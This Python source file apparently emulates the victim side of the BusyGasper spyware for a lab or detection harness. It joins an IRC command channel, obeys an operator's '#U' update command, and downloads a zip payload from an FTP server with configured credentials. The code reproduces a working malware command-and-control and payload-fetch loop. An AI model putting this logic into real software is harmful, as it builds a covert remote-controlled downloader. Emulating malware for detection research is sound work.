import socket
import threading
from typing import Callable, Optional

from config import EmulationConfig
from protocol import (
    expect_ftp_range,
    is_ip_literal,
    is_zip_payload,
    parse_pasv_response,
    recv_line,
    recv_until_closed,
    resolve_a_record,
    send_line,
)


class BusyGasperVictim(threading.Thread):
    def __init__(
        self,
        config: EmulationConfig,
        stop_event: threading.Event,
        trace: Optional[Callable[[str], None]] = None,
    ) -> None:
        super().__init__(name="busygasper-victim", daemon=True)
        self.config = config
        self.stop_event = stop_event
        self.trace = trace or print
        self.ready = threading.Event()
        self.done = threading.Event()
        self.error: Optional[BaseException] = None
        self.downloaded_payload = b""

    def run(self) -> None:
        try:
            irc_host = self._resolve_irc_host(self.config.irc_connect_host)
            with socket.create_connection(
                (irc_host, self.config.irc_port),
                timeout=self.config.socket_timeout,
            ) as irc:
                irc.settimeout(self.config.socket_timeout)
                self._irc_register(irc)
                self.ready.set()
                self._irc_loop(irc)
        except BaseException as exc:
            self.error = exc
            self.ready.set()
            self.done.set()

    def _resolve_irc_host(self, host: str) -> str:
        if is_ip_literal(host):
            return host
        return resolve_a_record(
            host,
            self.config.dns_server,
            self.config.dns_port,
            self.config.socket_timeout,
            self.trace,
        )

    def _irc_register(self, irc: socket.socket) -> None:
        nick = self.config.victim_nick
        send_line(irc, f"NICK {nick}", lambda line: self.trace(f"[V -> IRC-S] {line}"))
        send_line(irc, f"USER {nick} 8 * : IRC Client", lambda line: self.trace(f"[V -> IRC-S] {line}"))

        while not self.stop_event.is_set():
            line = recv_line(irc)
            if not line:
                raise ConnectionError("IRC server closed victim registration")
            self.trace(f"[IRC-S -> V] {line}")
            if " 433 " in line:
                nick = f"{nick}-"
                send_line(irc, f"NICK {nick}", lambda msg: self.trace(f"[V -> IRC-S] {msg}"))
            elif " 432 " in line:
                raise RuntimeError("IBadNick")
            elif line.startswith("PING "):
                send_line(irc, f"PONG {line[5:]}", lambda msg: self.trace(f"[V -> IRC-S] {msg}"))
            elif " 004" in line:
                return

    def _irc_loop(self, irc: socket.socket) -> None:
        while not self.stop_event.is_set():
            line = recv_line(irc)
            if not line:
                return
            self.trace(f"[IRC-S -> V] {line}")
            if line.startswith("PING "):
                send_line(irc, f"PONG {line[5:]}", lambda msg: self.trace(f"[V -> IRC-S] {msg}"))
                continue
            if not line.startswith(f":{self.config.operator_nick}"):
                continue

            payload = self._extract_payload_like_busy_gasper(line)
            if payload.startswith("#U"):
                self._handle_update_command(payload)
                ack = f"PRIVMSG {self.config.operator_nick} :{self.config.package_name} updated"
                send_line(irc, ack, lambda msg: self.trace(f"[V -> IRC-S] {msg}"))
                self.done.set()
                return

    @staticmethod
    def _extract_payload_like_busy_gasper(line: str) -> str:
        idx = line[1:].find(":")
        if idx == -1:
            return ""
        return line[idx + 2 :]

    def _handle_update_command(self, command: str) -> None:
        remote_name = command[2:]
        if "," in remote_name:
            remote_name = remote_name.split(",", 1)[0]
        if not remote_name:
            raise RuntimeError("CMD err")
        self.downloaded_payload = self._ftp_download(remote_name)
        if not is_zip_payload(self.downloaded_payload):
            raise RuntimeError(f"{remote_name} err")

    def _ftp_download(self, remote_name: str) -> bytes:
        with socket.create_connection(
            (self.config.ftp_connect_host, self.config.ftp_port),
            timeout=self.config.socket_timeout,
        ) as ftp:
            ftp.settimeout(self.config.socket_timeout)
            banner = recv_line(ftp)
            self.trace(f"[FTP-S -> V] {banner}")
            expect_ftp_range(banner, 200, 300)

            send_line(ftp, f"user {self.config.ftp_user}", lambda line: self.trace(f"[V -> FTP-S] {line}"))
            expect_ftp_range(self._read_ftp(ftp), 300, 400)

            send_line(ftp, f"pass {self.config.ftp_pass}", lambda line: self.trace(f"[V -> FTP-S] {line}"))
            expect_ftp_range(self._read_ftp(ftp), 200, 300)

            send_line(ftp, "pasv", lambda line: self.trace(f"[V -> FTP-S] {line}"))
            pasv_line = self._read_ftp(ftp)
            data_host, data_port = parse_pasv_response(pasv_line)

            with socket.create_connection((data_host, data_port), timeout=self.config.socket_timeout) as data_sock:
                data_sock.settimeout(self.config.socket_timeout)

                send_line(ftp, "type i", lambda line: self.trace(f"[V -> FTP-S] {line}"))
                expect_ftp_range(self._read_ftp(ftp), 200, 300)

                send_line(ftp, f"retr {remote_name}", lambda line: self.trace(f"[V -> FTP-S] {line}"))
                expect_ftp_range(self._read_ftp(ftp), 100, 200)

                payload = recv_until_closed(data_sock)
                self.trace(f"[FTP-D -> V] received {len(payload)} bytes")

            expect_ftp_range(self._read_ftp(ftp), 200, 300)

            send_line(ftp, "quit", lambda line: self.trace(f"[V -> FTP-S] {line}"))
            expect_ftp_range(self._read_ftp(ftp), 200, 300)
            return payload

    def _read_ftp(self, ftp: socket.socket) -> str:
        line = recv_line(ftp)
        self.trace(f"[FTP-S -> V] {line}")
        return line
